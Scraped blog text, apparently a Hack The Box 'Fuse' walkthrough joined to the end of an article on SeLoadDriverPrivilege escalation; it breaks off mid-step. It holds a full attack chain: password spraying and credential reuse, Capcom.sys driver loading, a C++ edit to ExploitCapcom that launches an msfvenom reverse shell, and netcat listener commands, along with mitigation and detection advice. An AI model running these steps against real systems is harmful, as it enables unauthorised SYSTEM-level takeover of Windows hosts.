of this attack on my walkthrough for Fuse: https://bloodstiller.com/walkthroughs/fuse-box/ Step 1: Enabling the SeLoadDriverPrivilege Privilege: The first step involves activating the SeLoadDriverPrivilege. Windows uses a token-based system for managing user privileges, and SeLoadDriverPrivilege is usually disabled by default, even if it\u0026rsquo;s assigned to a user. Attackers can use Windows API functions like LookupPrivilegeValue() and AdjustTokenPrivileges() to enable this privilege on their token.\nStep 2: Registry Interaction: Once activated, SeLoadDriverPrivilege allows interaction with a critical area of the Windows Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services. This registry key is crucial for driver loading, and access to it is a key part of the exploitation process. Step 3: Loading a Vulnerable Driver: With the privilege activated and registry access established, the attacker can now load a driver of their choosing.\nThis is typically done by registering a malicious or vulnerable driver via the Windows registry and then using the NtLoadDriver() function to load it into kernel mode. Step 4: Exploiting the Driver: The final step involves exploiting the loaded driver. Attackers often choose to load known vulnerable drivers, such as the infamous Capcom.sys. (which is a Windows signed driver) These vulnerable drivers can be exploited to execute arbitrary code in kernel space, effectively giving the attacker complete control over the system.\nCapcom.sys Driver Vulnerability: Arbitrary Code Execution with SYSTEM Privileges Now that we\u0026rsquo;ve confirmed we have the necessary privilege and the system is vulnerable, let\u0026rsquo;s look at the specific vulnerability we\u0026rsquo;ll be exploiting.\nTL;DR: Key Takeaways Capcom.sys is a vulnerable driver that allows attackers to execute arbitrary code with SYSTEM privileges. Protections like VBS and HVCI can help mitigate risks, but require modern hardware. Driver block rules: can provide an additional layer of defense by preventing vulnerable drivers from loading. Overview of the Capcom.sys Vulnerability: The Capcom.sys kernel driver is notorious for its functionality that permits the execution of arbitrary code in kernel mode directly from user space.\nSpecifically, this driver disables SMEP (Supervisor Mode Execution Prevention) before invoking a function provided by the attacker, enabling us to run code with SYSTEM privileges.\nYou can find the real Capcom.sys driver on GitHub: Capcom.sys driver on GitHub Affected Windows Versions:\nThis exploit has been tested and verified on the following Windows versions: Windows 7 (x64) Windows 8.1 (x64) Windows 10 (x64) up to build 17134 (Version 1708) Windows 11 (x64) up to build 22000.194 (Version 21H2) Builds after 22000.194 contain deny lists that prevent this driver from loading. Security Considerations:\nModern versions of Windows have introduced protections like Virtualization-based Security (VBS) and Hypervisor-Protected Code Integrity (HVCI) to mitigate the risks posed by vulnerable drivers such as Capcom.sys.\nThese security mechanisms enforce code integrity in the kernel, allowing only signed code to execute and blocking known vulnerable or malicious drivers. However, it\u0026rsquo;s important to note that these features often require newer hardware and can have a performance impact.\nFor a deeper dive into the issue of signed vulnerable drivers, you can refer to:\nWeLiveSecurity\u0026rsquo;s article Mitigation Strategies:\nTo safeguard against vulnerabilities like this, Microsoft recommends implementing driver block rules as part of a comprehensive security policy. These block rules prevent the loading of known vulnerable or malicious drivers. Additionally, custom enterprise code integrity policies can be used to monitor and enforce these rules, with audit logs generated whenever a blocked driver attempts to load. For more on how to implement and enforce these rules, check out:\nRed Canary\u0026rsquo;s guide on driver block rules Real-World Exploitation Example To better understand how SeLoadDriverPrivilege exploitation works in practice, let\u0026rsquo;s walk through a real-world example. This demonstration will show each step of the process, from identifying the vulnerability to achieving system-level access.\nPrerequisites: Before we begin, ensure you have the following tools and environment set up:\nA Windows virtual machine for compiling the necessary tools:\nI recommend using https://github.com/mandiant/commando-vm Visual Studio for C++ compilation\nMsfvenom for payload generation\nA target Windows machine with SeLoadDriverPrivilege enabled for a non-admin user\nThis can be the Fuse machine on HTB or on an internal lab of your own. This is taken from my walkthrough of the HTB box fuse:\nhttps://bloodstiller.com/walkthroughs/fuse-box/ Finding out we have the SeLoadDriverPrivilege privilege: The first step in any privilege escalation attempt is to enumerate the current user\u0026rsquo;s privileges. In this case, we\u0026rsquo;re looking specifically for the SeLoadDriverPrivilege.\nI enumerate the privileges of my user: whoami /priv Checking my group memberships confirms this also: Checking the system is vulnerable to the exploit: Not all systems are vulnerable to this exploit, even if the SeLoadDriverPrivilege is present. We need to check the Windows build number to ensure it\u0026rsquo;s below a certain threshold.\nI check the build: [System.Environment]::OSVersion.Version It\u0026rsquo;s 14393 so we can move forward with this attack. Executing the Attack Now that we understand the vulnerability and have confirmed our system is susceptible, let\u0026rsquo;s walk through the actual attack process.\nI will include all steps as a means for you to be able to reproduce this with the box Fuse. Download A Copy of the official Capcom.sys Signed Driver: Download the official driver: wget https://github.com/FuzzySecurity/Capcom-Rootkit/raw/refs/heads/master/Driver/Capcom.sys We will keep it locally at the moment as there are some other tools we need to compile before we can move forward. Compiling the EopLoadDriver tool to enable us to load the Capcom.sys driver: The EopLoadDriver tool is a utility designed to leverage the SeLoadDriverPrivilege for loading a driver into the Windows kernel. It interacts with the Windows registry to register the driver and then uses the NtLoadDriver system call to load it. This tool is essential in our exploit chain as it allows us to load the vulnerable Capcom.sys driver, which we\u0026rsquo;ll subsequently exploit to gain SYSTEM privileges. By using EopLoadDriver, we\u0026rsquo;re able to bridge the gap between having the SeLoadDriverPrivilege and actually loading a driver of our choice into the kernel.\nPreparing the EopLoadDriver C++ Project:\nThis is a C++ file that will need to be compiled within Visual Studio:\nI download the project: https://github.com/TarlogicSecurity/EoPLoadDriver/ I create a new project: Then type Console into the search bar \u0026amp; select ConsolApp with C++ written below it. Click Next Give it a name \u0026amp; also select: Place solution and project in the same directory:\nHit \u0026quot;Create\u0026quot; This provides a standard Hello World template, which can be used as the basis for the project:\nImporting the EopLoadDriver code \u0026amp; Compiling:\nDelete all the code on the Hello World generated file \u0026amp; paste in the contents of Targlogic\u0026rsquo;s EopLoadDriver code: https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp Modify the imports by removing stdafx.h so they look like this now:\nRun the build and it should build successfully:\nCompiling the ExploitCapcom exploit C++ project The ExploitCapcom tool is the core component of our privilege escalation attack. It\u0026rsquo;s designed to exploit the vulnerability in the Capcom.sys driver that we\u0026rsquo;ve loaded using EopLoadDriver. This tool takes advantage of the driver\u0026rsquo;s ability to disable Supervisor Mode Execution Prevention (SMEP) and execute arbitrary code in kernel mode. By default, ExploitCapcom opens a new command prompt with SYSTEM privileges, but we\u0026rsquo;ll modify it to launch our custom payload instead. This tool effectively completes the privilege escalation chain, leveraging the loaded vulnerable driver to elevate our permissions to the highest level in the Windows operating system.\nImporting the ExploitCapcom C++ Project:\nThis time clone the repo:\nPaste in the repo url:\nhttps://github.com/tandasat/ExploitCapcom.git Modifying ExploitCapcom exploit to enable a reverse shell To make our exploit more useful, we\u0026rsquo;ll modify it to give us a reverse shell instead of just opening a new command prompt.\nOpen ExploitCapcom.cpp and do not remove the stdafx.h import:\nThe reason being is the actual required file containing the header is in this project. So you can compile with it. This exploit by default opens a new elevated shell, however this requires we have GUI access. So modify to run a reverse shell:\nBelow is the code we are going to modify:\nTCHAR CommandLine[] = TEXT(\u0026quot;C:\\\\Windows\\\\system32\\\\cmd.exe\u0026quot;); Modify it to run a reverse shell generated via msfvenom:\nRemember if you are not using the Fuse walkthrough to modify the path to one you have access to. // Launches a command shell process static bool LaunchShell() { //Original Line Commented Out: //TCHAR CommandLine[] = TEXT(\u0026#34;C:\\\\Windows\\\\system32\\\\cmd.exe\u0026#34;); TCHAR CommandLine[] = TEXT(\u0026#34;C:\\\\Users\\\\svc-print\\\\Documents\\\\shell.exe\u0026#34;); PROCESS_INFORMATION ProcessInfo; STARTUPINFO StartupInfo = { sizeof(StartupInfo) }; if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, \u0026amp;StartupInfo, \u0026amp;ProcessInfo)) { return false; } CloseHandle(ProcessInfo.hThread); CloseHandle(ProcessInfo.hProcess); return true; } Compile it:\nGenerating our reverse-shell payload using msfvenom: Generate a simple reverse shell using msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[AttackIP] LPORT=[AttackPort] -f exe -o shell.exe Run the exploit chain on the victim: Now that we have all our tools ready, let\u0026rsquo;s execute the attack:\nI Use evil-winrm to transfer all the files to the target:\nupload [filename] Use whatever method you prefer Load the driver Run Exploit:\n.\\EopLoadDriver.exe System\\CurrentControlSet\\Capcom C:\\Users\\svc-print\\Documents\\Capcom.sys All 0\u0026rsquo;s is good as a response, means we are working. Setup Listener:\nrlwrap -cAr nc -lnvp 443 Trigger exploit:\n.\\ExploitCapcom.exe Catch the reverse shell and verify privileges:\nSummary: This real-world example demonstrates the entire process of exploiting the SeLoadDriverPrivilege, from initial enumeration to achieving SYSTEM-level access.\nDefending Against SeLoadDriverPrivilege Attacks: Given the potential for abuse, it\u0026rsquo;s crucial for system administrators to take steps to mitigate the risks associated with SeLoadDriverPrivilege. This includes:\nRestricting privilege assignment to only the most trusted accounts. Implementing rigorous driver integrity checks. Regularly auditing account privileges to detect any unauthorized changes. Using driver blocklists to prevent known vulnerable drivers from being loaded. Employing application control solutions like Windows Defender Application Control (WDAC) or AppLocker to restrict driver loading. Detection is equally important. Monitoring Windows Event Logs for driver loading events (Event ID 6), configuring Sysmon to track driver loads, and implementing behavioral analysis to spot unusual patterns of driver loading can all help in identifying potential attacks.\nIt\u0026rsquo;s important to note that no single measure can provide complete protection against SeLoadDriverPrivilege exploitation. A defense-in-depth strategy, combining multiple layers of security controls, is crucial for comprehensive protection against this and other potential vulnerabilities.\nConclusion: SeLoadDriverPrivilege serves as a stark reminder of the complexities involved in securing modern operating systems. What appears to be a benign administrative privilege can, in the wrong hands, become a powerful tool for system compromise. Mitigating such vulnerabilities will remain crucial in our ongoing efforts to protect our systems and data.\nFurther Reading: For those interested in diving deeper into this topic, I recommend exploring:\nMicrosoft documentation on User Rights Assignment Windows Internals, Part 1 by Pavel Yosifovich MITRE ATT\u0026amp;CK framework , particularly the entry on T1543.003 - Create or Modify System Process (Windows Service). Frequently Asked Questions: Q: Is SeLoadDriverPrivilege a vulnerability in Windows?\nA: SeLoadDriverPrivilege itself is not a vulnerability, but rather a legitimate Windows privilege that can be misused. The vulnerability lies in improper assignment or management of this privilege. Q: Can SeLoadDriverPrivilege be completely disabled?\nA: While it\u0026rsquo;s not recommended to completely disable this privilege as it\u0026rsquo;s used by legitimate Windows processes, it\u0026rsquo;s crucial to strictly limit which accounts have this privilege assigned. Q: How can I check if my account has SeLoadDriverPrivilege?\nA: You can use the Windows \u0026ldquo;Local Security Policy\u0026rdquo; editor (secpol.msc) and navigate to \u0026ldquo;Security Settings\u0026rdquo; \u0026gt; \u0026ldquo;Local Policies\u0026rdquo; \u0026gt; \u0026ldquo;User Rights Assignment\u0026rdquo; to see which accounts have this privilege assigned. Q: Are there any legitimate uses for SeLoadDriverPrivilege?\nA: Yes, this privilege is used by system processes and certain applications that need to load drivers. For example, some antivirus software and system management tools require this privilege. Q: How difficult is it to exploit SeLoadDriverPrivilege?\nA: While the basic concept is straightforward, successfully exploiting this privilege requires a good understanding of Windows internals and kernel-mode programming. However, ready-made exploit tools do exist, lowering the barrier for less skilled attackers. Appendix: Sources used: https://attack.mitre.org/techniques/T1543/003/ https://www.amazon.co.uk/dp/0735684189?psc=1\u0026smid=A3P5ROKL5A1OLE\u0026ref_=chk_typ_imgToDp https://github.com/TarlogicSecurity/EoPLoadDriver/ https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/ https://redcanary.com/blog/threat-detection/ms-driver-block-rules/ https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/ https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt ",

        "content": "Fuse Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Fuse How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Fuse/scans/nmap 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 13:44:19 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 13:44 BST Nmap scan report for 10.129.2.5 Host is up (0.039s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds Initial thoughts: DNS, Web, Kerberos, LDAP, SMB are all great targets. In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46.02-HTB/BlogEntriesMade/Fuse/scans/nmap 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh took 11s 🕙 13:44:41 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 13:46 BST Nmap scan report for 10.129.2.5 Host is up (0.039s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn\u0026#39;t have a title (text/html). 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-16 13:01:33Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49675/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49676/tcp open msrpc Microsoft Windows RPC 49680/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC 49755/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2016 (89%) OS CPE: cpe:/o:microsoft:windows_server_2016 Aggressive OS guesses: Microsoft Windows Server 2016 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-time: | date: 2024-10-16T13:02:27 |_ start_date: 2024-10-16T12:39:39 | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Fuse | NetBIOS computer name: FUSE\\x00 | Domain name: fabricorp.local | Forest name: fabricorp.local | FQDN: Fuse.fabricorp.local |_ System time: 2024-10-16T06:02:28-07:00 |_clock-skew: mean: 2h33m00s, deviation: 4h02m31s, median: 12m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 237.63 seconds RPC is also present \u0026amp; we can extract alot of information using RPC. LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker python3 ldapchecker.py $box It turns out the anonymous bind is not enabled but we can still get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.12.6 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 13:44:45 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.2.5 with SSL... Failed to connect with SSL. Retrying without SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=fabricorp,DC=local CN=Configuration,DC=fabricorp,DC=local CN=Schema,CN=Configuration,DC=fabricorp,DC=local DC=DomainDnsZones,DC=fabricorp,DC=local DC=ForestDnsZones,DC=fabricorp,DC=local We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=FUSE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=fabricorp,DC=local It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt I get 3 valid users \u0026amp; add them to my users list. RPC: I connect using a null session, however we are unable to enumerate: rpcclient -U '%' $box SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Guest account is disabled \u0026amp; the null session cannot enumerate the shares. Trying Usernames as Passwords: I always try usernames as passwords as well: netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+] HTTP 80: It appears to be a print logger: Discovering Usernames in the CSV Entries: There are CSV files that can downloaded: Looking at them I can see that there are users we did not find using kerbrute: Discovering their may be an issue with the printing service in the CSV entries: We can see that there is a printing issue: This may not seem like much, but if they are facing issues it may let us know their is a wider issue. Directory Busting With FFUF: I Perform some directory busting to see if there are any interesting directories: ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://fuse.fabricorp.local/papercut/FUZZ -fc 403 -ic Fuzzing for more CSV\u0026rsquo;s with FFUF: As the download string for the csv is in the below format we can fuzz it using FFUF /papercut/logs/csv/monthly/papercut-print-log-2020-05.csv I fuzz it using custom wordlist. ffuf -w ~/Wordlists/45.06-CustomWordlists/numbersDays-1-31.txt:MONTH -w ~/Wordlists/45.06-CustomWordlists/numbersYears-1990-2049.txt:YEAR -u http://fuse.fabricorp.local//papercut/logs/csv/monthly/papercut-print-log-YEAR-MONTH.csv -fc 403 -ic Just the same two entries we have already found. Finding a password in the Printer Logs: Looking back through the print logs I see the string Fabricorp01.docx, if we remove the .docx it looks alot like a password:\nI use netexec to password spray:\nnetexec smb $box -u Users.txt -p 'Fabricorp01' --shares The response: STATUS_PASSWORD_MUST_CHANGE means that the password is correct but has to be changed on the next login! Changing the expired password: Attempt 1: Trying to change the expired password using smbpasswd.py: I try and change the users passwords using smbpasswd.py by impacket: sudo python3 smbpasswd.py $domain\\$user:$pass@$box -newpass 'N3wPass1$$09%12828' It does not work. Lets see if we can find another way to change this password online. +Note+: Only reason I used sudo was incase there was anything strange happening where I needed to. Attempt 2: Trying to change the password using powershell: After some searching online, I find [[https://hinchley.net/articles/changing-your-expired-active-directory-password-via-powershell ][this article]] which details the change via powershell. It\u0026rsquo;s worth a shot:\nI fire up my windows vm \u0026amp; connect to the VPN:\nI Modify my hosts file \u0026amp; then modify the script on the page but still cannot change the password.\nLets see if we can do it via impacket again but with different arguments.\nAttempt 3: Finally changing a password with smbpasswd.py: python3 smbpasswd.py $user:$pass@$box -newpass 'N3wPassWILLTHISWORK1$$09%'\n+Note+:\nI think the main issue\u0026rsquo;s why this did not work before are due to the initial password I tried not being complex enough, 'N3Pass1' \u0026amp; for some reason it doesn\u0026rsquo;t like when we use the domain name. I can list shares in netexec:\nHowever after I try and access the shares again for further enumeration, it appears as if the password has been changed:\nI check the older password 'Fabricorp01' and it seems to have reverted to that:\nThis looks like it\u0026rsquo;s reverting to the previous password after a certain amount of time. Preparing commands to access SMB: As it appears we have a time limit before the password is reset we need to prepare all of our commands to ensure we access the resources.\nBasic envs \u0026amp; password change:\nuser=tlavel oldPass=Fabricorp01 newPass=\u0026#39;BrandNewPassword69!1811\u0026#39; python3 smbpasswd.py $user:$oldPass@$box -newpass $newPass Tools:\nnetexec smb $box -u $user -p $newPass --shares smbmap -u $user -p $newPass -H $box -r 3 I check all users who\u0026rsquo;s passwords can be changed. It\u0026rsquo;s easy using the above approach as all we have to do is modify the user env. tlavel bhult bnielson It appears that all users have access to the same shares \u0026amp; the most interesting one is the print$ share. +Note+: This is why I like using envs they make time sensitive tasks like this ALOT quicker \u0026amp; smoother. Downloading the entire print$ share: I download everything using smbget: smbget -U $domain/$user --recursive \u0026quot;smb://$box/print$\u0026quot; +Note+: bnielson was the last user I was logged in as that\u0026rsquo;s why I am doing this as them. BrandNewPassword69!181128!!!!!\nsmbget -U $domain/$user --recursive \u0026quot;smb://$box/sysvol\u0026quot; Searching for more information in the pillaged smb files: I look through the files but there is nothing interesting I can see/find. Trying to dump user information via ldapsearch: As we can access the host using credentials temporarily I try and dump all user information using ldap: ldapsearch -H ldap://fuse.$domain-x -b \u0026quot;DC=fuse,DC=fabricorp\u0026quot; -D \u0026quot;cn=$user,dc=fuse,dc=fabricorp\u0026quot; -w $newPass-s sub \u0026quot;(\u0026amp;(objectclass=user))\u0026quot; \u0026gt;\u0026gt; ldapUsersAll.txt However it just errors out: Enumerating using rpcclient: I change the password again and manage to get an rpc session:\nrpcclient -U $user $box I dump all the users on the domain:\nenumdomusers This is good as it gives us more users now. I query each user individually to see if there is any important information in their descriptions, but find nothing:\nqueryuser [RID] Finding a hard-coded clear text credential a printer description: I enumerate the printers using rpclient and find a hardcoded password in the description field:\nenumprinters I cred stuff using newly found credentials \u0026amp; users:\nnetexec smb $box -u Users.txt -p $pass --continue-on-success | grep [+] I get two hits: svc-print svc-scan I have a deep dive on rpc available here:\nhttps://bloodstiller.com/cheatsheets/rpc-cheatsheet/ 2. Foothold: Enumerating as svc-print: Running a bloodhound collection: Now that we have creds that arent\u0026rsquo; changing all the time we can to a full bloodhound collection: python3 bloodhound.py -dc fuse.$domain -c All -u $user -p $pass -d $domain -ns $box Connecting to the host using evil-winrm: I connect to the host using evil-winrm:\nevil-winrm -i $box -u $user -p $pass I get the user flag:\n3. Privilege Escalation: I have written a deep dive that goes into this exploitation method in more detail: https://bloodstiller.com/articles/seloaddriverprivilegeescalation/ Finding out we have the SeLoadDriverPrivilege privilege: I enumerate the privileges of my user: whoami /priv Checking my group memberships confirms this also: From previous experience I know this is a viable privilege escalation path using the Capcom.sys exploit. Checking the system is vulnerable to the exploit: The Capcom.sys attack only works if the Windows build is below build 17134.\nBut how do I know this? I will share how I know this information soon. I check the build:\n[System.Environment]::OSVersion.Version It\u0026rsquo;s 14393 so we can move forward with this attack. Print Operators Group Explained: Allowed local logon to DCs; can exploit Windows to load malicious drivers.\nBeing part of the Print Operators Group grants users the SeLoadDriverPrivilege\nPrint Operators Group Overview:\nPurpose: Provides management capabilities for printers connected to domain controllers and Active Directory printer objects within the domain. Capabilities:\nManage, create, share, and delete printers. Manage Active Directory printer objects. Locally sign in to and shut down domain controllers. Caution and Restrictions:\nMember Caution: Due to the ability to load and unload device drivers on domain controllers, add members cautiously. Restrictions: Cannot be renamed, deleted, or removed. No default members. Attributes and Permissions:\nWell-known SID/RID: S-1-5-32-550 Type: Builtin Local Default Container: CN=Builtin, DC=[domain], DC=[domain] Protected by AdminSDHolder?: Yes Movement Restrictions: Cannot be moved out of the default container. Delegation: Not safe to delegate management to non-service admins. +Default+ User Rights. Allow log on locally: SeInteractiveLogonRight Load and unload device drivers: SeLoadDriverPrivilege This is what we are mainly interested in as we can load a malicious driver. Shut down the system: SeShutdownPrivilege SeLoadDriverPrivilege Explained: Permits the dynamic loading and unloading of device drivers, which can be essential for system updates or configuration changes. Being part of the Print Operators Group provides this privilege by default. There is a great article here about how it can be abused. We can take advantage of this privilege to exploit a well known vulnerable driver called Capcom.sys to run code as SYSTEM. 4. Ownership: Capcom.sys Driver Vulnerability: Arbitrary Code Execution with SYSTEM Privileges TL;DR: Key Takeaways Capcom.sys is a vulnerable driver that allows attackers to execute arbitrary code with SYSTEM privileges. Protections like VBS and HVCI can help mitigate risks, but require modern hardware. Driver block rules: can provide an additional layer of defense by preventing vulnerable drivers from loading. Overview of the Capcom.sys Vulnerability: The Capcom.sys kernel driver is notorious for its functionality that permits the execution of arbitrary code in kernel mode directly from user space.\nSpecifically, this driver disables SMEP (Supervisor Mode Execution Prevention) before invoking a function provided by the attacker, enabling us to run code with SYSTEM privileges.\nYou can find the real Capcom.sys driver on GitHub: Capcom.sys driver on GitHub Affected Windows Versions:\nThis exploit has been tested and verified on the following Windows versions: Windows 7 (x64) Windows 8.1 (x64) Windows 10 (x64) up to build 17134 (Version 1708) Windows 11 (x64) up to build 22000.194 (Version 21H2) Builds after 22000.194 contain deny lists that prevent this driver from loading. Security Considerations: Modern versions of Windows have introduced protections like Virtualization-based Security (VBS) and Hypervisor-Protected Code Integrity (HVCI) to mitigate the risks posed by vulnerable drivers such as Capcom.sys.\nThese security mechanisms enforce code integrity in the kernel, allowing only signed code to execute and blocking known vulnerable or malicious drivers. However, it\u0026rsquo;s important to note that these features often require newer hardware and can have a performance impact.\nFor a deeper dive into the issue of signed vulnerable drivers, you can refer to:\nWeLiveSecurity\u0026rsquo;s article Mitigation Strategies:\nTo safeguard against vulnerabilities like this, Microsoft recommends implementing driver block rules as part of a comprehensive security policy. These block rules prevent the loading of known vulnerable or malicious drivers. Additionally, custom enterprise code integrity policies can be used to monitor and enforce these rules, with audit logs generated whenever a blocked driver attempts to load. For more on how to implement and enforce these rules, check out:\nRed Canary\u0026rsquo;s guide on driver block rules Download A Copy of the official Capcom.sys Driver: Download the official driver: wget https://github.com/FuzzySecurity/Capcom-Rootkit/raw/refs/heads/master/Driver/Capcom.sys We will keep it locally at the moment as there are some other tools we need to compile before we can move forward. Compiling the EopLoadDriver tool to enable us to load the Capcom.sys driver: The EopLoadDriver tool is a utility designed to leverage the SeLoadDriverPrivilege for loading a driver into the Windows kernel. It interacts with the Windows registry to register the driver and then uses the NtLoadDriver system call to load it. This tool is essential in our exploit chain as it allows us to load the vulnerable Capcom.sys driver, which we\u0026rsquo;ll subsequently exploit to gain SYSTEM privileges. By using EopLoadDriver, we\u0026rsquo;re able to bridge the gap between having the SeLoadDriverPrivilege and actually loading a driver of our choice into the kernel.\nPreparing the EopLoadDriver ~C++ Project: This is a C++ file that will need to be compiled within Visual Studio so I will spin up my Windows VM\nI download the project: https://github.com/TarlogicSecurity/EoPLoadDriver/ I create a new project: Then type Console into the search bar \u0026amp; select ConsolApp with C++ written below it. Click Next I give it a name \u0026amp; also select: Place solution and project in the same directory:\nHit \u0026quot;Create\u0026quot; +Note+: Just incase you are unaware, this just puts source code \u0026amp; project itself in the same directory is all. This provides a standard Hello World template, which we can use as the basis of our project:\nImporting the EopLoadDriver code \u0026amp; Compiling: I delete all the code on the Hello World generated file \u0026amp; paste in the contents of Targlogic\u0026rsquo;s EopLoadDriver code:\nhttps://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp I set it to release \u0026amp; then press build but get errors relating to stdafx.h:\nI do some searching online \u0026amp; find this:\nSo my imports look like this now:\nI re-run the build and it builds 